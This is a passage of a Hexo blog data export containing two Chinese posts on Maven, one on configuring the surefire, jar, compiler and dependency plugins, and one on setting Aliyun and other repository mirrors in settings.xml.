<version>2.18.1</version>\n        <configuration>\n          ......\n　　　　　　配置内容\n　　　　　　......\n        </configuration>\n      </plugin>\n```\n```\n \n\n//常用通用配置\n// 跳过测试阶段\n<skipTests>true</skipTests>\n或者 \n\nmvn install -DskipTests\n或者 （Compliler插件也会根据该参数跳过编译测试类） \n\nmvn install -Dmaven.test.skip=true\n \n```\n忽略测试失败 \nMaven在测试阶段出现失败的用例时，默认的行为是停止当前构建，构建过程也会以失败结束。有时候（如测试驱动开发模式）即使测试出现失败用例，仍然希望能继续构建项目。\n```\n<testFailureIgnore>true</testFailureIgnore> \n或者\n\nmvn test -Dmaven.test.failure.ignore=true\n \n```\n- maven-jar-plugin\n\n默认的mvn install生成的jar是不带主类入口的，需要在maven-compile-plugin中设置主类\n```\n<plugin>\n                <groupId>org.apache.maven.plugins</groupId>\n                <artifactId>maven-jar-plugin</artifactId>\n                <configuration>\n                    <archive>\n                        <manifest>\n                            <addClasspath>true</addClasspath>\n                            <classpathPrefix>lib/</classpathPrefix>\n                        </manifest>\n                    </archive>\n                </configuration>\n            </plugin>\n```\n- maven-compiler-plugin\n\n设置编译器的版本\n\n```\n<plugin>\n                <groupId>org.apache.maven.plugins</groupId>\n                <artifactId>maven-compiler-plugin</artifactId>\n                <version>3.1</version>\n                <configuration>\n                    <source>1.7</source>\n                    <target>1.7</target>\n                </configuration>\n            </plugin>\n```\n- maven-dependency-plugin\n把依赖的jar包单独放到一个目录下\n```\n<plugin>\n                <groupId>org.apache.maven.plugins</groupId>\n                <artifactId>maven-dependency-plugin</artifactId>\n                <executions>\n                    <execution>\n                        <id>copy-dependencies</id>\n                        <phase>prepare-package</phase>\n                        <goals>\n                            <goal>copy-dependencies</goal>\n                        </goals>\n                        <configuration>\n                            <outputDirectory>${project.build.directory}/lib</outputDirectory>\n                            <overWriteReleases>false</overWriteReleases>\n                            <overWriteSnapshots>false</overWriteSnapshots>\n                            <overWriteIfNewer>true</overWriteIfNewer>\n                        </configuration>\n                    </execution>\n                </executions>\n            </plugin>\n```","slug":"开发工具/maven插件","published":1,"updated":"2018-07-10T13:10:10.002Z","_id":"cjjedmhck008m0gtjfvtzr2vu","comments":1,"layout":"post","photos":[],"link":"","content":"<ul>\n<li>maven-surefire-plugin</li>\n</ul>\n<p>Maven通过Maven Surefire Plugin插件执行单元测试。（通过Maven Failsafe Plugin插件执行集成测试）</p>\n<p>在pom.xml中配置JUnit,TestNG测试框架的依赖，即可自动识别和运行src/test目录下利用该框架编写的测试用例。surefire也能识别和执行符合一定命名约定的普通类中的测试方法（POJO测试）。</p>\n<p>生命周期中test阶段默认绑定的插件目标就是surefire中的test目标，无需额外配置，直接运行mvn test就可以。</p>\n<p>基本配置如下，下文中的配置项如无特殊说明，都位于pom文件的<configuration>节点中。<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;plugin&gt;</span><br><span class=\"line\">  &lt;groupId&gt;org.apache.maven.plugins&lt;/groupId&gt;</span><br><span class=\"line\">  &lt;artifactId&gt;maven-surefire-plugin&lt;/artifactId&gt;</span><br><span class=\"line\">  &lt;version&gt;2.18.1&lt;/version&gt;</span><br><span class=\"line\">  &lt;configuration&gt;</span><br><span class=\"line\">    ......</span><br><span class=\"line\">　　　　　　配置内容</span><br><span class=\"line\">　　　　　　......</span><br><span class=\"line\">  &lt;/configuration&gt;</span><br><span class=\"line\">&lt;/plugin&gt;</span><br></pre></td></tr></table></figure></configuration></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"> </span><br><span class=\"line\"></span><br><span class=\"line\">//常用通用配置</span><br><span class=\"line\">// 跳过测试阶段</span><br><span class=\"line\">&lt;skipTests&gt;true&lt;/skipTests&gt;</span><br><span class=\"line\">或者 </span><br><span class=\"line\"></span><br><span class=\"line\">mvn install -DskipTests</span><br><span class=\"line\">或者 （Compliler插件也会根据该参数跳过编译测试类） </span><br><span class=\"line\"></span><br><span class=\"line\">mvn install -Dmaven.test.skip=true</span><br></pre></td></tr></table></figure>\n<p>忽略测试失败<br>Maven在测试阶段出现失败的用例时，默认的行为是停止当前构建，构建过程也会以失败结束。有时候（如测试驱动开发模式）即使测试出现失败用例，仍然希望能继续构建项目。<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;testFailureIgnore&gt;true&lt;/testFailureIgnore&gt; </span><br><span class=\"line\">或者</span><br><span class=\"line\"></span><br><span class=\"line\">mvn test -Dmaven.test.failure.ignore=true</span><br></pre></td></tr></table></figure></p>\n<ul>\n<li>maven-jar-plugin</li>\n</ul>\n<p>默认的mvn install生成的jar是不带主类入口的，需要在maven-compile-plugin中设置主类<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;plugin&gt;</span><br><span class=\"line\">                &lt;groupId&gt;org.apache.maven.plugins&lt;/groupId&gt;</span><br><span class=\"line\">                &lt;artifactId&gt;maven-jar-plugin&lt;/artifactId&gt;</span><br><span class=\"line\">                &lt;configuration&gt;</span><br><span class=\"line\">                    &lt;archive&gt;</span><br><span class=\"line\">                        &lt;manifest&gt;</span><br><span class=\"line\">                            &lt;addClasspath&gt;true&lt;/addClasspath&gt;</span><br><span class=\"line\">                            &lt;classpathPrefix&gt;lib/&lt;/classpathPrefix&gt;</span><br><span class=\"line\">                        &lt;/manifest&gt;</span><br><span class=\"line\">                    &lt;/archive&gt;</span><br><span class=\"line\">                &lt;/configuration&gt;</span><br><span class=\"line\">            &lt;/plugin&gt;</span><br></pre></td></tr></table></figure></p>\n<ul>\n<li>maven-compiler-plugin</li>\n</ul>\n<p>设置编译器的版本</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;plugin&gt;</span><br><span class=\"line\">                &lt;groupId&gt;org.apache.maven.plugins&lt;/groupId&gt;</span><br><span class=\"line\">                &lt;artifactId&gt;maven-compiler-plugin&lt;/artifactId&gt;</span><br><span class=\"line\">                &lt;version&gt;3.1&lt;/version&gt;</span><br><span class=\"line\">                &lt;configuration&gt;</span><br><span class=\"line\">                    &lt;source&gt;1.7&lt;/source&gt;</span><br><span class=\"line\">                    &lt;target&gt;1.7&lt;/target&gt;</span><br><span class=\"line\">                &lt;/configuration&gt;</span><br><span class=\"line\">            &lt;/plugin&gt;</span><br></pre></td></tr></table></figure>\n<ul>\n<li>maven-dependency-plugin<br>把依赖的jar包单独放到一个目录下<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;plugin&gt;</span><br><span class=\"line\">                &lt;groupId&gt;org.apache.maven.plugins&lt;/groupId&gt;</span><br><span class=\"line\">                &lt;artifactId&gt;maven-dependency-plugin&lt;/artifactId&gt;</span><br><span class=\"line\">                &lt;executions&gt;</span><br><span class=\"line\">                    &lt;execution&gt;</span><br><span class=\"line\">                        &lt;id&gt;copy-dependencies&lt;/id&gt;</span><br><span class=\"line\">                        &lt;phase&gt;prepare-package&lt;/phase&gt;</span><br><span class=\"line\">                        &lt;goals&gt;</span><br><span class=\"line\">                            &lt;goal&gt;copy-dependencies&lt;/goal&gt;</span><br><span class=\"line\">                        &lt;/goals&gt;</span><br><span class=\"line\">                        &lt;configuration&gt;</span><br><span class=\"line\">                            &lt;outputDirectory&gt;$&#123;project.build.directory&#125;/lib&lt;/outputDirectory&gt;</span><br><span class=\"line\">                            &lt;overWriteReleases&gt;false&lt;/overWriteReleases&gt;</span><br><span class=\"line\">                            &lt;overWriteSnapshots&gt;false&lt;/overWriteSnapshots&gt;</span><br><span class=\"line\">                            &lt;overWriteIfNewer&gt;true&lt;/overWriteIfNewer&gt;</span><br><span class=\"line\">                        &lt;/configuration&gt;</span><br><span class=\"line\">                    &lt;/execution&gt;</span><br><span class=\"line\">                &lt;/executions&gt;</span><br><span class=\"line\">            &lt;/plugin&gt;</span><br></pre></td></tr></table></figure></li>\n</ul>\n","site":{"data":{}},"excerpt":"","more":"<ul>\n<li>maven-surefire-plugin</li>\n</ul>\n<p>Maven通过Maven Surefire Plugin插件执行单元测试。（通过Maven Failsafe Plugin插件执行集成测试）</p>\n<p>在pom.xml中配置JUnit,TestNG测试框架的依赖，即可自动识别和运行src/test目录下利用该框架编写的测试用例。surefire也能识别和执行符合一定命名约定的普通类中的测试方法（POJO测试）。</p>\n<p>生命周期中test阶段默认绑定的插件目标就是surefire中的test目标，无需额外配置，直接运行mvn test就可以。</p>\n<p>基本配置如下，下文中的配置项如无特殊说明，都位于pom文件的<configuration>节点中。<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;plugin&gt;</span><br><span class=\"line\">  &lt;groupId&gt;org.apache.maven.plugins&lt;/groupId&gt;</span><br><span class=\"line\">  &lt;artifactId&gt;maven-surefire-plugin&lt;/artifactId&gt;</span><br><span class=\"line\">  &lt;version&gt;2.18.1&lt;/version&gt;</span><br><span class=\"line\">  &lt;configuration&gt;</span><br><span class=\"line\">    ......</span><br><span class=\"line\">　　　　　　配置内容</span><br><span class=\"line\">　　　　　　......</span><br><span class=\"line\">  &lt;/configuration&gt;</span><br><span class=\"line\">&lt;/plugin&gt;</span><br></pre></td></tr></table></figure></configuration></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"> </span><br><span class=\"line\"></span><br><span class=\"line\">//常用通用配置</span><br><span class=\"line\">// 跳过测试阶段</span><br><span class=\"line\">&lt;skipTests&gt;true&lt;/skipTests&gt;</span><br><span class=\"line\">或者 </span><br><span class=\"line\"></span><br><span class=\"line\">mvn install -DskipTests</span><br><span class=\"line\">或者 （Compliler插件也会根据该参数跳过编译测试类） </span><br><span class=\"line\"></span><br><span class=\"line\">mvn install -Dmaven.test.skip=true</span><br></pre></td></tr></table></figure>\n<p>忽略测试失败<br>Maven在测试阶段出现失败的用例时，默认的行为是停止当前构建，构建过程也会以失败结束。有时候（如测试驱动开发模式）即使测试出现失败用例，仍然希望能继续构建项目。<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;testFailureIgnore&gt;true&lt;/testFailureIgnore&gt; </span><br><span class=\"line\">或者</span><br><span class=\"line\"></span><br><span class=\"line\">mvn test -Dmaven.test.failure.ignore=true</span><br></pre></td></tr></table></figure></p>\n<ul>\n<li>maven-jar-plugin</li>\n</ul>\n<p>默认的mvn install生成的jar是不带主类入口的，需要在maven-compile-plugin中设置主类<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;plugin&gt;</span><br><span class=\"line\">                &lt;groupId&gt;org.apache.maven.plugins&lt;/groupId&gt;</span><br><span class=\"line\">                &lt;artifactId&gt;maven-jar-plugin&lt;/artifactId&gt;</span><br><span class=\"line\">                &lt;configuration&gt;</span><br><span class=\"line\">                    &lt;archive&gt;</span><br><span class=\"line\">                        &lt;manifest&gt;</span><br><span class=\"line\">                            &lt;addClasspath&gt;true&lt;/addClasspath&gt;</span><br><span class=\"line\">                            &lt;classpathPrefix&gt;lib/&lt;/classpathPrefix&gt;</span><br><span class=\"line\">                        &lt;/manifest&gt;</span><br><span class=\"line\">                    &lt;/archive&gt;</span><br><span class=\"line\">                &lt;/configuration&gt;</span><br><span class=\"line\">            &lt;/plugin&gt;</span><br></pre></td></tr></table></figure></p>\n<ul>\n<li>maven-compiler-plugin</li>\n</ul>\n<p>设置编译器的版本</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;plugin&gt;</span><br><span class=\"line\">                &lt;groupId&gt;org.apache.maven.plugins&lt;/groupId&gt;</span><br><span class=\"line\">                &lt;artifactId&gt;maven-compiler-plugin&lt;/artifactId&gt;</span><br><span class=\"line\">                &lt;version&gt;3.1&lt;/version&gt;</span><br><span class=\"line\">                &lt;configuration&gt;</span><br><span class=\"line\">                    &lt;source&gt;1.7&lt;/source&gt;</span><br><span class=\"line\">                    &lt;target&gt;1.7&lt;/target&gt;</span><br><span class=\"line\">                &lt;/configuration&gt;</span><br><span class=\"line\">            &lt;/plugin&gt;</span><br></pre></td></tr></table></figure>\n<ul>\n<li>maven-dependency-plugin<br>把依赖的jar包单独放到一个目录下<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;plugin&gt;</span><br><span class=\"line\">                &lt;groupId&gt;org.apache.maven.plugins&lt;/groupId&gt;</span><br><span class=\"line\">                &lt;artifactId&gt;maven-dependency-plugin&lt;/artifactId&gt;</span><br><span class=\"line\">                &lt;executions&gt;</span><br><span class=\"line\">                    &lt;execution&gt;</span><br><span class=\"line\">                        &lt;id&gt;copy-dependencies&lt;/id&gt;</span><br><span class=\"line\">                        &lt;phase&gt;prepare-package&lt;/phase&gt;</span><br><span class=\"line\">                        &lt;goals&gt;</span><br><span class=\"line\">                            &lt;goal&gt;copy-dependencies&lt;/goal&gt;</span><br><span class=\"line\">                        &lt;/goals&gt;</span><br><span class=\"line\">                        &lt;configuration&gt;</span><br><span class=\"line\">                            &lt;outputDirectory&gt;$&#123;project.build.directory&#125;/lib&lt;/outputDirectory&gt;</span><br><span class=\"line\">                            &lt;overWriteReleases&gt;false&lt;/overWriteReleases&gt;</span><br><span class=\"line\">                            &lt;overWriteSnapshots&gt;false&lt;/overWriteSnapshots&gt;</span><br><span class=\"line\">                            &lt;overWriteIfNewer&gt;true&lt;/overWriteIfNewer&gt;</span><br><span class=\"line\">                        &lt;/configuration&gt;</span><br><span class=\"line\">                    &lt;/execution&gt;</span><br><span class=\"line\">                &lt;/executions&gt;</span><br><span class=\"line\">            &lt;/plugin&gt;</span><br></pre></td></tr></table></figure></li>\n</ul>\n"},{"title":"maven配置阿里云仓库","date":"2018-07-10T13:09:19.000Z","_content":"settings.xml通用配置\n\n[官网链接](http://maven.apache.org/settings.html)\n\n一般格式：\n```\n <settings xmlns=\"http://maven.apache.org/SETTINGS/1.0.0\"\n      xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"\n      xsi:schemaLocation=\"http://maven.apache.org/SETTINGS/1.0.0\n                          https://maven.apache.org/xsd/settings-1.0.0.xsd\">\n      <localRepository/>\n      <interactiveMode/>\n      <usePluginRegistry/>\n      <offline/>\n      <pluginGroups/>\n      <servers/>\n      <mirrors/>\n      <proxies/>\n      <profiles/>\n      <activeProfiles/>\n    </settings>\n```\n\n阿里云镜像配置\n```\n<mirrors>\n    <mirror>\n      <id>alimaven</id>\n      <name>aliyun maven</name>\n      <url>\n          http://maven.aliyun.com/nexus/content/groups/public/\n      </url>\n      <mirrorOf>central</mirrorOf>        \n    </mirror>\n  </mirrors>\n```\n其他镜像\n```\n<mirrors>\n        <!-- 中央仓库在中国的镜像 -->\n        <mirror>\n            <id>maven.net.cn</id>\n            <name>oneof the central mirrors in china</name>\n            <url>http://maven.net.cn/content/groups/public/</url>\n            <mirrorOf>central</mirrorOf>\n        </mirror>\n        <mirror>\n            <id>alimaven</id>\n            <name>aliyun maven</name>\n            <url>http://maven.aliyun.com/nexus/content/groups/public/</url>\n            <mirrorOf>central</mirrorOf>\n        </mirror>\n        <mirror>\n            <id>central</id>\n            <name>Maven Repository Switchboard</name>\n            <url>http://repo1.maven.org/maven2/</url>\n            <mirrorOf>central</mirrorOf>\n        </mirror>\n        <mirror>\n            <id>repo2</id>\n            <mirrorOf>central</mirrorOf>\n            <name>Human Readable Name for this Mirror.</name>\n            <url>http://repo2.maven.org/maven2/</url>\n        </mirror>\n        <mirror>\n            <id>ibiblio</id>\n            <mirrorOf>central</mirrorOf>\n            <name>Human Readable Name for this Mirror.</name>\n            <url>http://mirrors.ibiblio.org/pub/mirrors/maven2/</url>\n        </mirror>\n        <mirror>\n            <id>jboss-public-repository-group</id>\n            <mirrorOf>central</mirrorOf>\n            <name>JBoss Public Repository Group</name>\n            <url>http://repository.jboss.org/nexus/content/groups/public</url>\n        </mirror>\n```","source":"_posts/开发工具/maven配置阿里云仓库.md","raw":"---\ntitle: maven配置阿里云仓库\ndate: 2018-07-10 21:09:19\ntags: 开发工具\n---\nsettings.xml通用配置\n\n[官网链接](http://maven.apache.org/settings.html)\n\n一般格式：\n```\n <settings xmlns=\"http://maven.apache.org/SETTINGS/1.0.0\"\n      xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"\n      xsi:schemaLocation=\"http://maven.apache.org/SETTINGS/1.0.0\n                          https://maven.apache.org/xsd/settings-1.0.0.xsd\">\n      <localRepository/>\n      <interactiveMode/>\n      <usePluginRegistry/>\n      <offline/>\n      <pluginGroups/>\n      <servers/>\n      <mirrors/>\n      <proxies/>\n      <profiles/>\n      <activeProfiles/>\n    </settings>\n```\n\n阿里云镜像配置\n```\n<mirrors>\n    <mirror>\n      <id>alimaven</id>\n      <name>aliyun maven</name>\n      <url>\n          http://maven.aliyun.com/nexus/content/groups/public/\n      </url>\n      <mirrorOf>central</mirrorOf>        \n    </mirror>\n  </mirrors>\n```\n其他镜像\n```\n<mirrors>\n        <!-- 中央仓库在中国的镜像 -->\n        <mirror>\n            <id>maven.net.cn</id>\n            <name>oneof the central mirrors in china</name>\n            <url>http://maven.net.cn/content/groups/public/</url>\n            <mirrorOf>central</mirrorOf>\n        </mirror>\n        <mirror>\n            <id>alimaven</id>\n            <name>aliyun maven</name>\n            <url>http://maven.aliyun.com/nexus/content/groups/public/</url>\n            <mirrorOf>central</mirrorOf>\n        </mirror>\n        <mirror>\n            <id>central</id>\n            <name>Maven Repository Switchboard</name>\n            <url>http://repo1.maven.org/maven2/</url>\n            <mirrorOf>central</mirrorOf>\n        </mirror>\n        <mirror>\n            <id>repo2</id>\n            <mirrorOf>central</mirrorOf>\n            <name>Human Readable Name for this Mirror.</name>\n            <url>http://repo2.maven.org/maven2/</url>\n        </mirror>\n        <mirror>\n            <id>ibiblio</id>\n            <mirrorOf>central</mirrorOf>\n            <name>Human Readable Name for this Mirror.</name>\n            <url>http://mirrors.ibiblio.org/pub/mirrors/maven2/</url>\n        </mirror>\n        <mirror>\n            <id>jboss-public-repository-group</id>\n            <mirrorOf>central</mirrorOf>\n            <name>JBoss Public Repository Group</name>\n            <url>http://repository.jboss.org/nexus/content/groups/public</url>\n        </mirror>\n```","slug":"开发工具/maven配置阿里云仓库","published":1,"updated":"2018-07-10T13:10:10.003Z","_id":"cjjedmhcl008p0gtjrnhbg1u0","comments":1,"layout":"post","photos":[],"link":"","content":"<p>settings.xml通用配置</p>\n<p><a href=\"http://maven.apache.org/settings.html\" target=\"_blank\" rel=\"noopener\">官网链接</a></p>\n<p>一般格式：<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;settings xmlns=&quot;http://maven.apache.org/SETTINGS/1.0.0&quot;</span><br><span class=\"line\">     xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span><br><span class=\"line\">     xsi:schemaLocation=&quot;http://maven.apache.org/SETTINGS/1.0.0</span><br><span class=\"line\">                         https://maven.apache.org/xsd/settings-1.0.0.xsd&quot;&gt;</span><br><span class=\"line\">     &lt;localRepository/&gt;</span><br><span class=\"line\">     &lt;interactiveMode/&gt;</span><br><span class=\"line\">     &lt;usePluginRegistry/&gt;</span><br><span class=\"line\">     &lt;offline/&gt;</span><br><span class=\"line\">     &lt;pluginGroups/&gt;</span><br><span class=\"line\">     &lt;servers/&gt;</span><br><span class=\"line\">     &lt;mirrors/&gt;</span><br><span class=\"line\">     &lt;proxies/&gt;</span><br><span class=\"line\">     &lt;profiles/&gt;</span><br><span class=\"line\">     &lt;activeProfiles/&gt;</span><br><span class=\"line\">   &lt;/settings&gt;</span><br></pre></td></tr></table></figure></p>\n<p>阿里云镜像配置<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;mirrors&gt;</span><br><span class=\"line\">    &lt;mirror&gt;</span><br><span class=\"line\">      &lt;id&gt;alimaven&lt;/id&gt;</span><br><span class=\"line\">      &lt;name&gt;aliyun maven&lt;/name&gt;</span><br><span class=\"line\">      &lt;url&gt;</span><br><span class=\"line\">          http://maven.aliyun.com/nexus/content/groups/public/</span><br><span class=\"line\">      &lt;/url&gt;</span><br><span class=\"line\">      &lt;mirrorOf&gt;central&lt;/mirrorOf&gt;        </span><br><span class=\"line\">    &lt;/mirror&gt;</span><br><span class=\"line\">  &lt;/mirrors&gt;</span><br></pre></td></tr></table></figure></p>\n<p>其他镜像<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;mirrors&gt;</span><br><span class=\"line\">        &lt;!-- 中央仓库在中国的镜像 --&gt;</span><br><span class=\"line\">        &lt;mirror&gt;</span><br><span class=\"line\">            &lt;id&gt;maven.net.cn&lt;/id&gt;</span><br><span class=\"line\">            &lt;name&gt;oneof the central mirrors in china&lt;/name&gt;</span><br><span class=\"line\">            &lt;url&gt;http://maven.net.cn/content/groups/public/&lt;/url&gt;</span><br><span class=\"line\">            &lt;mirrorOf&gt;central&lt;/mirrorOf&gt;</span><br><span class=\"line\">        &lt;/mirror&gt;</span><br><span class=\"line\">        &lt;mirror&gt;</span><br><span class=\"line\">            &lt;id&gt;alimaven&lt;/id&gt;</span><br><span class=\"line\">            &lt;name&gt;aliyun maven&lt;/name&gt;</span><br><span class=\"line\">            &lt;url&gt;http://maven.aliyun.com/nexus/content/groups/public/&lt;/url&gt;</span><br><span class=\"line\">            &lt;mirrorOf&gt;central&lt;/mirrorOf&gt;</span><br><span class=\"line\">        &lt;/mirror&gt;</span><br><span class=\"line\">        &lt;mirror&gt;</span><br><span class=\"line\">            &lt;id&gt;central&lt;/id&gt;</span><br><span class=\"line\">            &lt;name&gt;Maven Repository Switchboard&lt;/name&gt;</span><br><span class=\"line\">            &lt;url&gt;http://repo1.maven.org/maven2/&lt;/url&gt;</span><br><span class=\"line\">            &lt;mirrorOf&gt;central&lt;/mirrorOf&gt;</span><br><span class=\"line\">        &lt;/mirror&gt;</span><br><span class=\"line\">        &lt;mirror&gt;</span><br><span class=\"line\">            &lt;id&gt;repo2&lt;/id&gt;</span><br><span class=\"line\">            &lt;mirrorOf&gt;central&lt;/mirrorOf&gt;</span><br><span class=\"line\">            &lt;name&gt;Human Readable Name for this Mirror.&lt;/name&gt;</span><br><span class=\"line\">            &lt;url&gt;http://repo2.maven.org/maven2/&lt;/url&gt;</span><br><span class=\"line\">        &lt;/mirror&gt;</span><br><span class=\"line\">        &lt;mirror&gt;</span><br><span class=\"line\">            &lt;id&gt;ibiblio&lt;/id&gt;</span><br><span class=\"line\">            &lt;mirrorOf&gt;central&lt;/mirrorOf&gt;</span><br><span class=\"line\">            &lt;name&gt;Human Readable Name for this Mirror.&lt;/name&gt;</span><br><span class=\"line\">            &lt;url&gt;http://mirrors.ibiblio.org/pub/mirrors/maven2/&lt;/url&gt;</span><br><span class=\"line\">        &lt;/mirror&gt;</span><br><span class=\"line\">        &lt;mirror&gt;</span><br><span class=\"line\">            &lt;id&gt;jboss-public-repository-group&lt;/id&gt;</span><br><span class=\"line\">            &lt;mirrorOf&gt;central&lt;/mirrorOf&gt;</span><br><span class=\"line\">            &lt;name&gt;JBoss Public Repository Group&lt;/name&gt;</span><br><span class=\"line\">            &lt;url&gt;http://repository.jboss.org/nexus/content/groups/public&lt;/url&gt;</span><br><span class=\"line\">        &lt;/mirror&gt;</span><br></pre></td></tr></table></figure></p>\n","site":{"data":{}},"excerpt":"","more":"<p>settings.xml通用配置</p>\n<p><a href=\"http://maven.apache.org/settings.html\" target=\"_blank\" rel=\"noopener\">官网链接</a></p>\n<p>一般格式：<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span 